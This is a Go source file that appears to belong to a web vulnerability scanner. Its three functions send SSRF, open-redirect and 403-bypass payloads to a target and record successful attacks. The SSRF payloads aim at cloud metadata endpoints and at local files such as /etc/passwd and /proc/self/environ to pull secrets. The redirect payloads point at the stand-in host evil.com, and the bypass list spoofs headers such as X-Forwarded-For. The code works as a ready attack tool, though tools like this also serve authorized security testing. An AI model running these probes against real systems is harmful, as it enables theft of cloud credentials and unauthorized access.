package native

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

type AttackResult struct {
	Type        string `json:"type"`
	Endpoint    string `json:"endpoint"`
	Payload     string `json:"payload"`
	Success     bool   `json:"success"`
	StatusCode  int    `json:"status_code"`
	Evidence    string `json:"evidence"`
}

func TestSSRF(baseURL string, params map[string]string) []AttackResult {
	payloads := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/user-data/",
		"http://127.0.0.1:22",
		"http://127.0.0.1:3306",
		"http://127.0.0.1:6379",
		"http://localhost:8080/_config",
		"http://[::1]:22",
		"http://0.0.0.0:22",
		"file:///etc/passwd",
		"file:///proc/self/environ",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://100.100.100.200/latest/meta-data/",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	var results []AttackResult

	for param, _ := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			buf := make([]byte, 1024)
			n, _ := resp.Body.Read(buf)
			resp.Body.Close()
			body := string(buf[:n])

			evidence := ""
			success := false

			if strings.Contains(body, "root:") || strings.Contains(body, "ami-") ||
				strings.Contains(body, "meta-data") || strings.Contains(body, "instance-id") {
				success = true
				evidence = "Sensitive data leaked in response"
			} else if resp.StatusCode == 200 && n > 100 {
				success = true
				evidence = fmt.Sprintf("HTTP 200 with %d bytes response (possible SSRF)", n)
			} else if resp.StatusCode == 500 {
				evidence = "HTTP 500 - possible server-side request"
			}

			if success {
				results = append(results, AttackResult{
					Type:       "SSRF",
					Endpoint:   baseURL,
					Payload:    payload,
					Success:    true,
					StatusCode: resp.StatusCode,
					Evidence:   evidence,
				})
			}
		}
	}

	return results
}

func TestOpenRedirect(baseURL string, params map[string]string) []AttackResult {
	payloads := []string{
		"//evil.com",
		"https://evil.com",
		"http://evil.com",
		"//evil.com@good.com",
		"https://evil.com%2F@good.com",
		"//evil.com%2F..",
		"/\\evil.com",
		"https://evil.com?",
		"https://evil.com#",
		"///evil.com",
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	var results []AttackResult

	for param, _ := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			location := resp.Header.Get("Location")
			if location != "" && (resp.StatusCode == 301 || resp.StatusCode == 302 || resp.StatusCode == 303 || resp.StatusCode == 307 || resp.StatusCode == 308) {
				redirectTarget := strings.ToLower(location)
				if strings.Contains(redirectTarget, "evil.com") || strings.Contains(redirectTarget, "//") {
					results = append(results, AttackResult{
						Type:       "Open Redirect",
						Endpoint:   baseURL,
						Payload:    payload,
						Success:    true,
						StatusCode: resp.StatusCode,
						Evidence:   fmt.Sprintf("Redirects to: %s", location),
					})
				}
			}
		}
	}

	return results
}

func TestBypass403(targetURL string) []AttackResult {
	bypasses := []struct {
		path    string
		headers map[string]string
	}{
		{path: "/%2e/", headers: nil},
		{path: "/path/.", headers: nil},
		{path: "//path//", headers: nil},
		{path: "/./path/./", headers: nil},
		{path: "/path%20", headers: nil},
		{path: "/path%09", headers: nil},
		{path: "/path?", headers: nil},
		{path: "/path.html", headers: nil},
		{path: "/path.php", headers: nil},
		{path: "/path", headers: map[string]string{"X-Forwarded-For": "127.0.0.1"}},
		{path: "/path", headers: map[string]string{"X-Forwarded-Host": "localhost"}},
		{path: "/path", headers: map[string]string{"X-Real-IP": "127.0.0.1"}},
		{path: "/path", headers: map[string]string{"X-Original-URL": "/path"}},
		{path: "/path", headers: map[string]string{"X-Rewrite-URL": "/path"}},
		{path: "/path", headers: map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}},
		{path: "/path", headers: map[string]string{"X-Originating-IP": "127.0.0.1"}},
		{path: "/path;.css", headers: nil},
		{path: "/path;.js", headers: nil},
		{path: "/../path/../", headers: nil},
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var results []AttackResult

	for _, bp := range bypasses {
		req, _ := http.NewRequest("GET", targetURL+bp.path, nil)
		for k, v := range bp.headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 403 {
			results = append(results, AttackResult{
				Type:       "403 Bypass",
				Endpoint:   targetURL + bp.path,
				Payload:    fmt.Sprintf("Headers: %v", bp.headers),
				Success:    resp.StatusCode == 200,
				StatusCode: resp.StatusCode,
				Evidence:   fmt.Sprintf("Path: %s -> HTTP %d", bp.path, resp.StatusCode),
			})
		}
	}

	return results
}
